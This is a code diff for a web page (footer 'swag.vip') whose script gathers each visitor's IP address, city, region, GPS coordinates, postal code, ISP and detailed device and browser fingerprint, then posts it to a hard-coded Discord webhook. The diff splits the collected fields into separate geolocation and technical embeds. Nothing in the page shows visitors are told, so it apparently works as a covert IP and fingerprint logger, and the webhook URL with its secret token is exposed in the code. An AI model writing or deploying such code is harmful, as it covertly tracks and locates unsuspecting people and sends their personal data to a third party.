@@ -683,66 +683,60 @@
             if (loadTime > 0) perfData = loadTime + ' ms';
         } catch(e) {}
 
-        function sendWebhook(extraFields) {
+        function sendWebhook() {
             var now = new Date();
             var date = now.toLocaleDateString('fr-FR');
             var heure = now.toLocaleTimeString('fr-FR');
 
-            var fields = [
+            var geoFields = [
                 { name: 'IP', value: '||`' + ip + '`||', inline: true },
                 { name: 'Date', value: date + ' ' + heure, inline: true },
-                { name: '\u200b', value: '\u200b', inline: false },
                 { name: 'Pays', value: (geo.country_name || 'N/A') + ' ' + (geo.country_code ? ':' + geo.country_code.toLowerCase() + ':' : ''), inline: true },
                 { name: 'Ville', value: geo.city || 'N/A', inline: true },
                 { name: 'Region', value: geo.region || 'N/A', inline: true },
-                { name: 'ISP', value: (geo.org || 'N/A').substring(0, 80), inline: false },
-                { name: '\u200b', value: '\u200b', inline: false },
-                { name: 'Navigateur', value: browser, inline: true },
-                { name: 'OS', value: os, inline: true },
-                { name: 'Appareil', value: device, inline: true },
-                { name: 'Platform', value: platform, inline: true },
-                { name: 'CPU Cores', value: '' + cpuCores, inline: true },
-                { name: 'RAM', value: ram, inline: true },
-                { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
-                { name: '\u200b', value: '\u200b', inline: false },
-                { name: 'Connexion', value: connType, inline: true },
-                { name: 'Vitesse DL', value: connDown, inline: true },
-                { name: 'Latence', value: connUp, inline: true },
-                { name: 'Batterie', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
-                { name: 'Touch', value: touch, inline: true },
-                { name: 'Cookies', value: cookies, inline: true },
-                { name: 'Do Not Track', value: doNotTrack, inline: true },
-                { name: '\u200b', value: '\u200b', inline: false },
-                { name: 'Langue', value: lang, inline: true },
-                { name: 'Fuseau horaire', value: tz, inline: true },
-                { name: 'Résolution', value: screenRes, inline: true },
-                { name: 'Pixel Ratio', value: '' + pixelRatio, inline: true },
-                { name: 'Color Depth', value: colorDepth, inline: true },
-                { name: 'Load Time', value: perfData, inline: true },
-                { name: '\u200b', value: '\u200b', inline: false },
-                { name: 'Referrer', value: referrer, inline: false }
+                { name: 'ISP', value: (geo.org || 'N/A').substring(0, 100), inline: false }
             ];
-
             if (geo.latitude && geo.longitude) {
-                fields.push({ name: 'Coordonnées', value: '||`' + geo.latitude + ', ' + geo.longitude + '`||', inline: true });
+                geoFields.push({ name: 'GPS', value: '||`' + geo.latitude + ', ' + geo.longitude + '`||', inline: true });
             }
             if (geo.postal) {
-                fields.push({ name: 'Code postal', value: geo.postal, inline: true });
+                geoFields.push({ name: 'Postal', value: geo.postal, inline: true });
             }
-            if (extraFields) {
-                fields = fields.concat(extraFields);
-            }
+
+            var techFields = [
+                { name: 'Nav', value: browser, inline: true },
+                { name: 'OS', value: os, inline: true },
+                { name: 'Device', value: device, inline: true },
+                { name: 'CPU', value: '' + cpuCores + ' cores', inline: true },
+                { name: 'RAM', value: ram, inline: true },
+                { name: 'GPU', value: '`' + gpu.substring(0, 80) + '`', inline: false },
+                { name: 'Conn', value: connType, inline: true },
+                { name: 'DL', value: connDown, inline: true },
+                { name: 'Ping', value: connUp, inline: true },
+                { name: 'Batt', value: batteryLevel + (charging !== 'N/A' ? (charging ? ' :green_circle:' : ' :red_circle:') : ''), inline: true },
+                { name: 'Screen', value: screenRes + ' @' + pixelRatio + 'x', inline: true },
+                { name: 'Lang', value: lang + ' | ' + tz, inline: true },
+                { name: 'Touch', value: touch, inline: true },
+                { name: 'Cookie', value: cookies, inline: true },
+                { name: 'Referrer', value: referrer, inline: false }
+            ];
 
             fetch('https://ptb.discord.com/api/webhooks/1530049010847449219/El-pK11mF902pbR4TJAOKWLtqHdHbZRFOs9TBKpr2ao6kjVF-cJZVSVGGEZ4taBA1bAV', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    embeds: [{
-                        title: 'New Visitor',
-                        color: 2894892,
-                        fields: fields,
-                        footer: { text: 'swag.vip' }
-                    }]
+                    embeds: [
+                        {
+                            title: 'New Visitor',
+                            color: 2894892,
+                            fields: geoFields,
+                            footer: { text: 'swag.vip' }
+                        },
+                        {
+                            color: 2894892,
+                            fields: techFields
+                        }
+                    ]
                 })
             });
         }
@@ -770,9 +764,7 @@
             })
             .catch(function() {
                 ip = 'N/A'; geo = {};
-                sendWebhook([
-                    { name: 'Status', value: 'IP non disponible', inline: false }
-                ]);
+                sendWebhook();
             });
     </script>
 </body>
